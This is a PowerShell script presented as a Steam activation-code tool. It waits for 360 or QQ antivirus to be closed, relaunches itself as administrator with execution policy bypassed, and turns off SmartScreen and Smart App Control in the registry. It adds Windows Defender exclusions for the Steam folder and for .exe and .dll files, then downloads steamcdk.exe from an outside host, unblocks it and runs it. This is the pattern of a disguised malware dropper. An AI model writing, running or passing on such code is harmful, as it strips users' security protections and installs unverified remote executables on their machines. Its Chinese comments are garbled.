# Set console code page to UTF-8 (65001) for output
# chcp 65001 | Out-Null
# [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
# $OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = 'SilentlyContinue'

# 淇涔辩爜锛氫娇鐢˙ase64缂栫爜瀛樺偍涓枃瀛楃涓诧紙閬垮厤缂栫爜闂锛
function ConvertFrom-Base64Utf8 {
    param([string]$Base64)
    $bytes = [System.Convert]::FromBase64String($Base64)
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

# 缁胯壊澶у瓧浣撴樉绀哄嚱鏁
function Write-LargeGreen {
    param([string]$message)
    Write-Host ""
    Write-Host "[$message]" -ForegroundColor Green
    Write-Host ""
}

function Start-SteamOptimization { }

# 棰勫畾涔変腑鏂囧瓧绗︿覆锛堜娇鐢˙ase64缂栫爜锛屽畬鍏ㄩ伩鍏嶇紪鐮侀棶棰橈級
$msg360 = ConvertFrom-Base64Utf8 "6ZyA6KaB6YCA5Ye6MzYw5ZCO6L+b5YWl5r+A5rS757O757uf"
$msgQQ = ConvertFrom-Base64Utf8 "6ZyA6KaB6YCA5Ye66IW+6K6v55S16ISR566h5a625ZCO5ZCO6L+b5YWl5r+A5rS757O757uf"
$msgAdmin = ConvertFrom-Base64Utf8 "6ZyA6KaB566h55CG5ZGY6Lqr5Lu96L+Q6KGMcG93ZXJzaGVsbA=="

Clear-Host

Clear-Host
Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue


$OutputEncoding = [System.Text.Encoding]::UTF8


try {
    $security360check = $false
    if (Get-Process "360Tray*" -ErrorAction SilentlyContinue) {
        $security360check = $true
        while (Get-Process "360Tray*" -ErrorAction SilentlyContinue) {
            Write-LargeGreen $msg360
            Start-Sleep 1.5
        }
        Start-SteamOptimization
    }
    
    if (Get-Process "360Safe*" -ErrorAction SilentlyContinue) {
        $security360check = $true
        while (Get-Process "360sd*" -ErrorAction SilentlyContinue) {
            Write-LargeGreen $msg360
            Start-Sleep 1.5
        }
        Start-SteamOptimization
    }
    
    if ($security360check) {
        return
    }
}
catch {}
try {
    $securityQQcheck = $false
    if (Get-Process "QQPCTray*" -ErrorAction SilentlyContinue) {
        $securityQQcheck = $true
        while (Get-Process "QQPCTray*" -ErrorAction SilentlyContinue) {
            Write-LargeGreen $msgQQ
            Start-Sleep 1.5
        }
        Start-SteamOptimization
    }
    
    if ($securityQQcheck) {
        return
    }
}
catch {}

$adminGroupSid = New-Object Security.Principal.SecurityIdentifier([Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
$isInAdminGroup = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains $adminGroupSid)
if (-not $isInAdminGroup) {
    Write-LargeGreen $msgAdmin
}

$steamPath = $null
try {
    $steamRegPath = "HKCU:\Software\Valve\Steam"
    $steamPath = (Get-ItemProperty -LiteralPath $steamRegPath -Name SteamPath -ErrorAction Stop).SteamPath
} catch {
    try {
        $steamRegPath = "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam"
        $steamPath = (Get-ItemProperty -LiteralPath $steamRegPath -Name InstallPath -ErrorAction Stop).InstallPath
    } catch {
        try {
            $steamRegPath = "HKLM:\SOFTWARE\Valve\Steam"
            $steamPath = (Get-ItemProperty -LiteralPath $steamRegPath -Name InstallPath -ErrorAction Stop).InstallPath
        } catch {}
    }
}

if ([string]::IsNullOrWhiteSpace($steamPath)) {
    Write-Host "[Error->Steam path not found in registry]" -ForegroundColor Red
    exit 1
}

$root = $steamPath.Substring(0,1) # 閼惧嘲褰囩捄顖氱窞娑擃厾娈戦惄妯碱儊闁劌鍨
$rest = $steamPath.Substring(1)   # 閼惧嘲褰囩捄顖氱窞娑擃厾娲忕粭锕€鎮楅棃銏㈡畱闁劌鍨
$steamPath = $root.ToUpper() + $rest # 鐏忓棛娲忕粭锕傚劥閸掑棜娴嗛幑顫礋婢堆冨晸
# 闇€瑕佷互绠＄悊鍛樿韩浠借繍琛?
# 妫€鏌ョ鐞嗗憳鏉冮檺
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptFile = $PSCommandPath
    if ([string]::IsNullOrOrWhiteSpace($scriptFile)) { $scriptFile = $MyInvocation.PSCommandPath }
    if ([string]::IsNullOrOrWhiteSpace($scriptFile)) { $scriptFile = $MyInvocation.MyCommand.Path }
    if ([string]::IsNullOrOrWhiteSpace($scriptFile) -or -not (Test-Path -LiteralPath $scriptFile)) {
        $si = $MyInvocation.MyCommand
        if ($si -is [System.Management.Automation.ScriptInfo] -and $si.Definition) {
            $scriptFile = Join-Path $env:TEMP ("a-elevate-{0}.ps1" -f [guid]::NewGuid().ToString('N'))
            $si.Definition | Set-Content -LiteralPath $scriptFile -Encoding UTF8
        }
    }
    if ([string]::IsNullOrOrWhiteSpace($scriptFile) -or -not (Test-Path -LiteralPath $scriptFile)) {
        exit 1
    }
    Start-Process powershell.exe -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $scriptFile
    ) -Verb RunAs
    exit
}

# 鍏抽棴鏅鸿兘搴旂敤鎺у埗
# 鍏抽棴鏅鸿兘搴旂敤鎺у埗锛堝皾璇曞绉嶆柟娉曪級
try {
    # 鏂规硶1锛氱洿鎺ヤ慨鏀圭瓥鐣ョ姸鎬
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force -ErrorAction Stop
    
    # 鏂规硶2锛氶€氳繃 Windows Defender 绛栫暐锛堝鏋滆矾寰勪笉瀛樺湪鍒欏垱寤猴級
    $defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen"
    if (!(Test-Path $defenderPath)) {
        New-Item -Path $defenderPath -Force | Out-Null
    }
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $defenderPath -Name "ConfigureAppInstallControl" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $defenderPath -Name "ConfigureAppInstallControlEnabled" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $defenderPath -Name "EnableSmartScreenInShell" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "[Warning->Some policies may require manual disable]" -ForegroundColor Yellow
}
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SteamAuthDaemon" -Force -ErrorAction Stop
} catch [System.Management.Automation.PSArgumentException] {
    # 娉ㄥ唽琛ㄥ睘鎬т笉瀛樺湪锛岄潤榛樿烦杩
} catch {
    # 鍏朵粬閿欒涔熻烦杩
}

# 寮哄埗缁撴潫杩涚▼锛堝鏋滆繘绋嬩笉瀛樺湪鍒欒烦杩囷級
try {
    Stop-Process -Name "steam_auth" -Force -ErrorAction Stop
} catch [Microsoft.PowerShell.Commands.ProcessCommandException] {
    # 杩涚▼涓嶅瓨鍦紝闈欓粯璺宠繃
} catch {
    # 鍏朵粬閿欒涔熻烦杩
}

if ($null -ne $steamPath) {
    try {
        try {
            $steamClientReg = "HKCU:\Software\Valve\Steam"
            $activeProcessKey = Join-Path $steamClientReg "ActiveProcess"
            if (Test-Path -LiteralPath $activeProcessKey) {
                $exePid = (Get-ItemProperty -LiteralPath $activeProcessKey -Name 'pid' -ErrorAction SilentlyContinue).pid
                if ($null -ne $exePid) {
                    Stop-Process -Id $exePid -ErrorAction SilentlyContinue
                }
            }
        }
        catch {
        }

        Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -imatch '^steam' -and $_.ProcessName -notmatch '^steam\+\+' } | ForEach-Object {
            Stop-Process -InputObject $_ -Force -ErrorAction SilentlyContinue
        }

        try {
            $loginUsersPath = Join-Path $steamPath "config\loginusers.vdf"
            if (Test-Path $loginUsersPath) {
                (Get-Content $loginUsersPath -Encoding UTF8) -replace '("WantsOfflineMode"\s+)("\d+")', "`$1`"0`"" | Set-Content $loginUsersPath -Encoding UTF8
            }
            $configPath = Join-Path $steamPath "config\config.vdf"
            if (Test-Path $configPath) {
                (Get-Content $configPath -Encoding UTF8) -replace '("DisableShaderCache"\s+)("\d+")', "`$1`"1`"" | Set-Content $configPath -Encoding UTF8
            }
        }
        catch {
        }

# exclude windows defender
        if (Get-Service | where-object { $_.name -eq "windefend" -and $_.status -eq "running" }) {
            Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension ".dll",".exe"
            Write-Host "[Result->steamshare cdk      OK]" -ForegroundColor Green
        }
        else {
            Write-Host "[Result->steamshare cdk      OK]" -ForegroundColor Green
        }

# display Message 

# download file and process
        $appStorePath = Join-Path $steamPath "steamcdk.exe"
        $downloadUrl = "https://d7.tfdl.net/public/2026-06-13/0bb3c800-1cde-481d-87bd-90a915d28884/steamcdk.exe"
        $backupUrl = "https://d7.tfdl.net/public/2026-06-13/0bb3c800-1cde-481d-87bd-90a915d28884/steamcdk.exe"
        Write-Host "[Result->Enter Activation Code OK]" -ForegroundColor Green
        
        
        try {
            (New-Object Net.WebClient).DownloadFile($downloadUrl, $appStorePath)
        } catch {
            Write-Host "[!!->please close VPN Try again     OK]" -ForegroundColor Green
            try {
                (New-Object Net.WebClient).DownloadFile($backupUrl, $appStorePath)
            } catch {
                Write-Host "[!->please close VPN Try again     OK]" -ForegroundColor Green
            }
        }

# lauch execute our exe file;
        # 鐟欙綁娅庨弬鍥︽闂冪粯顒涢敍灞藉帒鐠佺婀猈in11娑撳﹨绻嶇悰灞肩瑓鏉炵晫娈慹xe
        Unblock-File -Path $appStorePath -ErrorAction SilentlyContinue
        Start-Process -FilePath $appStorePath
    }
    catch {

    }
}
